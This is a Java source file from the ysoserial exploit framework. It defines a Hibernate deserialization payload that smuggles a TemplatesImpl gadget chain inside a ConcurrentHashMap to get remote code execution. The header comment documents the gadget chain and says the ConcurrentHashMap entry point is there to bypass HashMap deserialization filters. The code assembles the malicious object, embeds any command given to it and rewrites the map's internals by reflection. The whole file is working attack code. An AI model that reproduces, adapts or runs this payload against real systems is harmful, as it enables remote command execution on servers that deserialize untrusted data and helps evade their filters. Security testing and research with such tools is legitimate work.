package ysoserial.payloads;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.concurrent.ConcurrentHashMap;

import org.hibernate.engine.spi.TypedValue;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.AbstractType;
import org.hibernate.type.ComponentType;
import org.hibernate.type.Type;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Hibernate via ConcurrentHashMap entry point — bypasses HashMap filters.

	Gadget chain:
		ObjectInputStream.readObject()
			ConcurrentHashMap.readObject()
				ConcurrentHashMap.putVal()
					TypedValue.hashCode()
						ComponentType.getHashCode()
							AbstractComponentTuplizer.getPropertyValue()
								BasicGetter.get()  [Hibernate 4]
									TemplatesImpl.getOutputProperties()
										TemplatesImpl.newTransformer()
											defineTransletClasses() → RCE

	Same Hibernate chain as Hibernate1 but with ConcurrentHashMap entry.
	Hibernate1 uses HashMap (via Gadgets.makeMap) which is commonly filtered.

	Requires:
		hibernate-core 4.3.x or 5.x
 */

@Authors({ Authors.MBECHLER })
@PayloadTest(precondition = "isApplicableJavaVersion")
public class Hibernate3 extends PayloadRunner implements ObjectPayload<ConcurrentHashMap>, DynamicDependencies {

	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isAtLeast(7);
	}

	public static String[] getDependencies() {
		if (System.getProperty("hibernate5") != null) {
			return new String[] {
				"org.hibernate:hibernate-core:5.0.7.Final", "aopalliance:aopalliance:1.0",
				"org.jboss.logging:jboss-logging:3.3.0.Final", "javax.transaction:javax.transaction-api:1.2"
			};
		}
		return new String[] {
			"org.hibernate:hibernate-core:4.3.11.Final", "aopalliance:aopalliance:1.0",
			"org.jboss.logging:jboss-logging:3.3.0.Final", "javax.transaction:javax.transaction-api:1.2",
			"dom4j:dom4j:1.6.1"
		};
	}

	public ConcurrentHashMap getObject(final String command) throws Exception {
		final Object tpl = Gadgets.createTemplatesImpl(command);
		final Object getters = Hibernate1.makeGetter(tpl.getClass(), "getOutputProperties");

		PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
		Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);

		ComponentType t = Reflections.createWithConstructor(
			ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
		Reflections.setFieldValue(t, "componentTuplizer", tup);
		Reflections.setFieldValue(t, "propertySpan", 1);
		Reflections.setFieldValue(t, "propertyTypes", new Type[] { t });

		TypedValue v1 = new TypedValue(t, null);
		Reflections.setFieldValue(v1, "value", tpl);
		Reflections.setFieldValue(v1, "type", t);

		// ConcurrentHashMap instead of HashMap
		ConcurrentHashMap<Object, Object> chm = new ConcurrentHashMap<Object, Object>(1);
		chm.put("dummy", "dummy");

		Field tableField = ConcurrentHashMap.class.getDeclaredField("table");
		Reflections.setAccessible(tableField);
		Object[] table = (Object[]) tableField.get(chm);

		for (int i = 0; i < table.length; i++) {
			if (table[i] != null) {
				Field keyField = table[i].getClass().getDeclaredField("key");
				Reflections.setAccessible(keyField);
				keyField.set(table[i], v1);
				break;
			}
		}

		return chm;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Hibernate3.class, args);
	}
}
